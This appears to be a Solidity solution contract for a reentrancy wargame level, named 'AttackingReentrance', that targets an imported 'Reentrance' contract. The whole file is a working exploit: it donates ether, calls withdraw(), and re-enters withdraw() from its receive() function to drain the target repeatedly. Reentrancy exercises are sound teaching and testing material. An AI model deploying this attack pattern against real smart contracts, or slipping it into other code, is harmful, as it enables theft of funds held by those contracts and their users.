// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        (bool s, ) = contractAddress.call{value: address(this).balance}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(s, "low-level call failed");

        (s, ) = contractAddress.call(abi.encodeWithSignature("withdraw()"));
        require(s, "low-level call failed");
    }

    receive() external payable {
        (bool s, ) = contractAddress.call(
            abi.encodeWithSignature("withdraw()")
        );
        require(s, "low-level call failed");
    }
}
